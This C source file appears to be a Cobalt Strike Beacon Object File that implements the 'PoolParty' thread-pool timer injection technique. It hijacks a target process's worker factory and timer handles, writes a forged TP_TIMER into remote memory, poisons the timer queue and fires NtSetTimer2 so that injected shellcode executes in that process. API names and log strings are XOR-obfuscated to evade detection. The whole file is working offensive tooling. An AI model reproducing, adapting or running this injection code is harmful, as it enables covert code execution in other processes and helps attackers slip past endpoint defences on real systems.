#include <windows.h>
#define PP_OPEN_PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
#define PP_HIJACK_TIMER
#include "PoolPartyBof.h"

HANDLE m_p_hWorkerFactory = NULL;
HANDLE m_p_hTimer = NULL;

static const unsigned char kApiNtQueryInformationWorkerFactory[] = { 0xE9, 0x48, 0xC0, 0x2B, 0x4E, 0xA6, 0x11, 0xB8, 0xC9, 0x5A, 0xFE, 0x2C, 0x46, 0xB5, 0x1C, 0x98, 0xC8, 0x52, 0xC6, 0x31, 0x59, 0xBF, 0x0D, 0x83, 0xE1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xF1 };
// "NtQueryInformationWorkerFactory"
static const unsigned char kApiNtSetTimer2[] = { 0xE9, 0x48, 0xC2, 0x3B, 0x5F, 0x80, 0x01, 0x9C, 0xC2, 0x4E, 0xA3, 0x5E };
// "NtSetTimer2"
static const unsigned char kFmtTimerQueueChanged[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x2A, 0x42, 0xB9, 0x0D, 0x83, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x48, 0x92, 0xCF, 0x5D, 0xFF, 0x39, 0x4E, 0xB0, 0x53, 0xD1, 0xD4, 0x57, 0xF8, 0x2E, 0x5B, 0xB1, 0x0C, 0xD1, 0xD4, 0x48, 0xF0, 0x32, 0x4E, 0xF4, 0x1A, 0x9E, 0xCB, 0x50, 0xF3, 0x3F, 0x48, 0xBF, 0x46 };
// "[-] Target timer queue changed; skipped stale rollback."
static const unsigned char kFmtV8Wf[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xEF, 0x55, 0xFB, 0x3F, 0x48, 0xBF, 0x0D, 0x95, 0x87, 0x4B, 0xFE, 0x2C, 0x40, 0xB1, 0x1A, 0xD1, 0xC1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xD1, 0xCF, 0x5D, 0xFF, 0x3A, 0x47, 0xB1, 0x48, 0x97, 0xD5, 0x53, 0xFC, 0x7E, 0x5F, 0xBC, 0x0D, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x81, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7, 0x52, 0xD1, 0x82, 0x4C, 0x91 };
// "[INFO] \tHijacked worker factory handle from the target process: %p"
static const unsigned char kFmtV8Info[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF5, 0x59, 0xE5, 0x2C, 0x42, 0xB1, 0x1E, 0x94, 0xC3, 0x1C, 0xE5, 0x3F, 0x59, 0xB3, 0x0D, 0x85, 0x87, 0x4B, 0xFE, 0x2C, 0x40, 0xB1, 0x1A, 0xD1, 0xC1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xD1, 0xC5, 0x5D, 0xE2, 0x37, 0x48, 0xF4, 0x01, 0x9F, 0xC1, 0x53, 0xE3, 0x33, 0x4A, 0xA0, 0x01, 0x9E, 0xC9, 0x3C };
// "[INFO] \tRetrieved target worker factory basic information"
static const unsigned char kFmtV8Timer[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xEF, 0x55, 0xFB, 0x3F, 0x48, 0xBF, 0x0D, 0x95, 0x87, 0x48, 0xF8, 0x33, 0x4E, 0xA6, 0x48, 0x80, 0xD2, 0x59, 0xE4, 0x3B, 0x0B, 0xBC, 0x09, 0x9F, 0xC3, 0x50, 0xF4, 0x7E, 0x4D, 0xA6, 0x07, 0x9C, 0x87, 0x48, 0xF9, 0x3B, 0x0B, 0xA0, 0x09, 0x83, 0xC0, 0x59, 0xE5, 0x7E, 0x5B, 0xA6, 0x07, 0x92, 0xC2, 0x4F, 0xE2, 0x64, 0x0B, 0xF1, 0x18, 0xF1 };
// "[INFO] \tHijacked timer queue handle from the target process: %p"
static const unsigned char kFmtV8Tp[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE4, 0x4E, 0xF4, 0x3F, 0x5F, 0xB1, 0x0C, 0xD1, 0xF3, 0x6C, 0xCE, 0x0A, 0x62, 0x99, 0x2D, 0xA3, 0x87, 0x4F, 0xE5, 0x2C, 0x5E, 0xB7, 0x1C, 0x84, 0xD5, 0x59, 0xB1, 0x3F, 0x58, 0xA7, 0x07, 0x92, 0xCE, 0x5D, 0xE5, 0x3B, 0x4F, 0xF4, 0x1F, 0x98, 0xD3, 0x54, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0x82, 0xCF, 0x59, 0xFD, 0x32, 0x48, 0xBB, 0x0C, 0x94, 0xA7 };
// "[INFO] \tCreated TP_TIMER structure associated with the shellcode"
static const unsigned char kFmtV8Alloc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE6, 0x50, 0xFD, 0x31, 0x48, 0xB5, 0x1C, 0x94, 0xC3, 0x1C, 0xC5, 0x0E, 0x74, 0x80, 0x21, 0xBC, 0xE2, 0x6E, 0xB1, 0x33, 0x4E, 0xB9, 0x07, 0x83, 0xDE, 0x1C, 0xF8, 0x30, 0x0B, 0xA0, 0x00, 0x94, 0x87, 0x48, 0xF0, 0x2C, 0x4C, 0xB1, 0x1C, 0xD1, 0xD7, 0x4E, 0xFE, 0x3D, 0x4E, 0xA7, 0x1B, 0xCB, 0x87, 0x19, 0xE1, 0x5E };
// "[INFO] \tAllocated TP_TIMER memory in the target process: %p"
static const unsigned char kFmtV8Wrote[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF0, 0x4E, 0xF8, 0x2A, 0x5F, 0xB1, 0x06, 0xD1, 0xD3, 0x54, 0xF4, 0x7E, 0x58, 0xA4, 0x0D, 0x92, 0xCE, 0x5D, 0xFD, 0x32, 0x52, 0xF4, 0x0B, 0x83, 0xC6, 0x5A, 0xE5, 0x3B, 0x4F, 0xF4, 0x3C, 0xA1, 0xF8, 0x68, 0xD8, 0x13, 0x6E, 0x86, 0x48, 0x82, 0xD3, 0x4E, 0xE4, 0x3D, 0x5F, 0xA1, 0x1A, 0x94, 0x87, 0x48, 0xFE, 0x7E, 0x5F, 0xBC, 0x0D, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x81, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7, 0x68 };
// "[INFO] \tWritten the specially crafted TP_TIMER structure to the target process"
static const unsigned char kFmtV8Mod[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xEA, 0x53, 0xF5, 0x37, 0x4D, 0xBD, 0x0D, 0x95, 0x87, 0x48, 0xF9, 0x3B, 0x0B, 0xA0, 0x09, 0x83, 0xC0, 0x59, 0xE5, 0x7E, 0x5B, 0xA6, 0x07, 0x92, 0xC2, 0x4F, 0xE2, 0x79, 0x58, 0xF4, 0x3C, 0xA1, 0xF8, 0x6C, 0xDE, 0x11, 0x67, 0xF4, 0x1C, 0x98, 0xCA, 0x59, 0xE3, 0x7E, 0x5A, 0xA1, 0x0D, 0x84, 0xC2, 0x1C, 0xC6, 0x37, 0x45, 0xB0, 0x07, 0x86, 0xD4, 0x6F, 0xE5, 0x3F, 0x59, 0xA0, 0x48, 0x90, 0xC9, 0x58, 0xB1, 0x09, 0x42, 0xBA, 0x0C, 0x9E, 0xD0, 0x4F, 0xB1, 0x1B, 0x45, 0xB0, 0x48, 0x85, 0xC8, 0x1C, 0xE1, 0x31, 0x42, 0xBA, 0x1C, 0xD1, 0xD3, 0x53, 0xB1, 0x2A, 0x43, 0xB1, 0x48, 0x82, 0xD7, 0x59, 0xF2, 0x37, 0x4A, 0xB8, 0x04, 0x88, 0x87, 0x5F, 0xE3, 0x3F, 0x4D, 0xA0, 0x0D, 0x95, 0x87, 0x68, 0xC1, 0x01, 0x7F, 0x9D, 0x25, 0xB4, 0xF5, 0x3C };
// "[INFO] \tModified the target process's TP_POOL timer queue WindowsStart and Windows End to point to the specially crafted TP_TIMER"
static const unsigned char kFmtV8Set[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF4, 0x59, 0xE5, 0x7E, 0x5F, 0xBC, 0x0D, 0xD1, 0xD3, 0x55, 0xFC, 0x3B, 0x59, 0xF4, 0x19, 0x84, 0xC2, 0x49, 0xF4, 0x7E, 0x5F, 0xBB, 0x48, 0x94, 0xDF, 0x4C, 0xF8, 0x2C, 0x4E, 0xF4, 0x1C, 0x9E, 0x87, 0x48, 0xE3, 0x37, 0x4C, 0xB3, 0x0D, 0x83, 0x87, 0x48, 0xF9, 0x3B, 0x0B, 0xB0, 0x0D, 0x80, 0xD2, 0x59, 0xE4, 0x3B, 0x42, 0xBA, 0x0F, 0xD1, 0xF3, 0x4C, 0xE1, 0x0A, 0x42, 0xB9, 0x0D, 0x83, 0xF6, 0x49, 0xF4, 0x2B, 0x4E, 0x91, 0x10, 0x81, 0xCE, 0x4E, 0xF0, 0x2A, 0x42, 0xBB, 0x06, 0xF1 };
// "[INFO] \tSet the timer queue to expire to trigger the dequeueing TppTimerQueueExpiration"

HANDLE HijackWorkerFactoryProcessHandle(HANDLE p_hTarget) {
    return HijackType(p_hTarget, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory), WORKER_FACTORY_QUERY_INFORMATION, 0);
}

HANDLE GetTargetThreadPoolWorkerFactoryHandle() {
    return HijackWorkerFactoryProcessHandle(m_p_hTargetPid);
}

static BOOL GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory, PWORKER_FACTORY_BASIC_INFORMATION pInfo) {
    _NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory;
    NTSTATUS Ntstatus;

    if (pInfo == NULL) {
        return FALSE;
    }
    MSVCRT$memset(pInfo, 0, sizeof(*pInfo));
    NtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)ResolveNtdllEnc(kApiNtQueryInformationWorkerFactory, (int)sizeof(kApiNtQueryInformationWorkerFactory));
    if (NtQueryInformationWorkerFactory == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtResolveFail);
        return FALSE;
    }
    Ntstatus = NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, pInfo, sizeof(*pInfo), NULL);
    if (!NT_SUCCESS(Ntstatus)) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV8Info);
    ApiPause();
    return TRUE;
}

HANDLE HijackIRTimerProcessHandle(HANDLE p_hTarget) {
    return HijackType(p_hTarget, kTypeIRTimer, (int)sizeof(kTypeIRTimer), TIMER_MODIFY_STATE, LocalIrTimerTypeIndex());
}

HANDLE GetTargetThreadPoolTimerHandle() {
    return HijackIRTimerProcessHandle(m_p_hTargetPid);
}

static void RestoreTimerQueueRootIfUnchanged(PVOID rootAddr, PVOID poisoned, PVOID orig) {
    PVOID current;

    current = NULL;
    if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, rootAddr, &current, sizeof(current), NULL)) {
        return;
    }
    if (current != poisoned) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTimerQueueChanged);
        return;
    }
    KERNEL32$WriteProcessMemory(m_p_hTargetPid, rootAddr, &orig, sizeof(orig), NULL);
}

static BOOL SetupExecution() {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation;
    PTP_TIMER pTpTimerLive;
    PFULL_TP_TIMER pTpTimerCopy;
    PFULL_TP_TIMER RemoteTpTimerAddress;
    LONGLONG Timeout;
    PVOID TpTimerWindowStartLinks;
    PVOID TpTimerWindowEndLinks;
    PVOID windowStartRoot;
    PVOID windowEndRoot;
    PVOID origWindowStartRoot;
    PVOID origWindowEndRoot;
    LARGE_INTEGER ulDueTime;
    T2_SET_PARAMETERS Parameters;
    _NtSetTimer2 NtSetTimer2;

    if (!GetWorkerFactoryBasicInformation(m_p_hWorkerFactory, &WorkerFactoryInformation)) {
        return FALSE;
    }
    if (WorkerFactoryInformation.StartParameter == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }

    NtSetTimer2 = (_NtSetTimer2)ResolveNtdllEnc(kApiNtSetTimer2, (int)sizeof(kApiNtSetTimer2));
    if (NtSetTimer2 == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtResolveFail);
        return FALSE;
    }

    windowStartRoot = (PVOID)((ULONG_PTR)WorkerFactoryInformation.StartParameter + offsetof(FULL_TP_POOL, TimerQueue.AbsoluteQueue.WindowStart.Root));
    windowEndRoot = (PVOID)((ULONG_PTR)WorkerFactoryInformation.StartParameter + offsetof(FULL_TP_POOL, TimerQueue.AbsoluteQueue.WindowEnd.Root));
    origWindowStartRoot = NULL;
    origWindowEndRoot = NULL;
    if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowStartRoot, &origWindowStartRoot, sizeof(origWindowStartRoot), NULL) ||
        !KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowEndRoot, &origWindowEndRoot, sizeof(origWindowEndRoot), NULL)) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }

    /*
     * Create the local TP_TIMER only to snapshot a real Windows layout.
     * Never write remote VAs (Pool / list links) into this live object:
     * CloseThreadpoolTimer walks those pointers in the beacon and AVs.
     * Do not pause while the live timer exists.
     */
    ApiPause();
    pTpTimerLive = KERNEL32$CreateThreadpoolTimer((PTP_TIMER_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
    if (pTpTimerLive == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV8Tp);

    pTpTimerCopy = (PFULL_TP_TIMER)BofAlloc(sizeof(FULL_TP_TIMER));
    if (pTpTimerCopy == NULL) {
        CloseTpTimerSafe(pTpTimerLive);
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    MSVCRT$memcpy(pTpTimerCopy, pTpTimerLive, sizeof(FULL_TP_TIMER));

    RemoteTpTimerAddress = (PFULL_TP_TIMER)KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (RemoteTpTimerAddress == NULL) {
        BofFree(pTpTimerCopy);
        CloseTpTimerSafe(pTpTimerLive);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteAllocFail);
        return FALSE;
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtV8Alloc, RemoteTpTimerAddress);

    Timeout = -10000000;
    pTpTimerCopy->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
    pTpTimerCopy->DueTime = Timeout;
    pTpTimerCopy->WindowStartLinks.Key = Timeout;
    pTpTimerCopy->WindowEndLinks.Key = Timeout;
    pTpTimerCopy->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimerCopy->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimerCopy->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
    pTpTimerCopy->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteTpTimerAddress, pTpTimerCopy, sizeof(FULL_TP_TIMER), NULL)) {
        BofFree(pTpTimerCopy);
        CloseTpTimerSafe(pTpTimerLive);
        RemoteFree(RemoteTpTimerAddress);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
        return FALSE;
    }
    BofFree(pTpTimerCopy);
    CloseTpTimerSafe(pTpTimerLive);
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV8Wrote);

    TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
    TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;

    /*
     * Do not ApiPause() between these two root writes and NtSetTimer2.
     * A pause here leaves the target timer queue poisoned and incomplete.
     */
    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, windowStartRoot, &TpTimerWindowStartLinks, sizeof(TpTimerWindowStartLinks), NULL)) {
        RemoteFree(RemoteTpTimerAddress);
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
        return FALSE;
    }
    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, windowEndRoot, &TpTimerWindowEndLinks, sizeof(TpTimerWindowEndLinks), NULL)) {
        RestoreTimerQueueRootIfUnchanged(windowStartRoot, TpTimerWindowStartLinks, origWindowStartRoot);
        /*
         * RemoteTpTimerAddress is left allocated: the target may already
         * have walked the poisoned WindowStart root.
         */
        OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV8Mod);

    MSVCRT$memset(&ulDueTime, 0, sizeof(ulDueTime));
    ulDueTime.QuadPart = Timeout;
    MSVCRT$memset(&Parameters, 0, sizeof(Parameters));
    if (!NT_SUCCESS(NtSetTimer2(m_p_hTimer, &ulDueTime, 0, &Parameters))) {
        RestoreTimerQueueRootIfUnchanged(windowStartRoot, TpTimerWindowStartLinks, origWindowStartRoot);
        RestoreTimerQueueRootIfUnchanged(windowEndRoot, TpTimerWindowEndLinks, origWindowEndRoot);
        /*
         * RemoteTpTimerAddress is left allocated: the target pool may
         * already hold pointers into this blob.
         */
        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV8Set);
    ApiPause();
    return TRUE;
}

void HijackHandles() {
    m_p_hWorkerFactory = GetTargetThreadPoolWorkerFactoryHandle();
    if (m_p_hWorkerFactory != NULL) {
        OBF_PRINT1(CALLBACK_OUTPUT, kFmtV8Wf, m_p_hWorkerFactory);
    }
    m_p_hTimer = GetTargetThreadPoolTimerHandle();
    if (m_p_hTimer != NULL) {
        OBF_PRINT1(CALLBACK_OUTPUT, kFmtV8Timer, m_p_hTimer);
    }
}

void Inject() {
    if (!InjectBegin()) {
        return;
    }
    HijackHandles();
    if (m_p_hWorkerFactory == NULL || m_p_hTimer == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtHijackFail);
        CloseHandleSafe(&m_p_hWorkerFactory);
        CloseHandleSafe(&m_p_hTimer);
        InjectCleanup();
        return;
    }
    if (!InjectAllocWrite()) {
        CloseHandleSafe(&m_p_hWorkerFactory);
        CloseHandleSafe(&m_p_hTimer);
        return;
    }
    if (!SetupExecution()) {
        CloseHandleSafe(&m_p_hWorkerFactory);
        CloseHandleSafe(&m_p_hTimer);
        InjectCleanup();
        return;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtDone);
    CloseHandleSafe(&m_p_hWorkerFactory);
    CloseHandleSafe(&m_p_hTimer);
    InjectCleanup();
}

void go(char * args, int len) {
    if (!ParseBeaconArgs(args, len)) {
        return;
    }
    Inject();
}
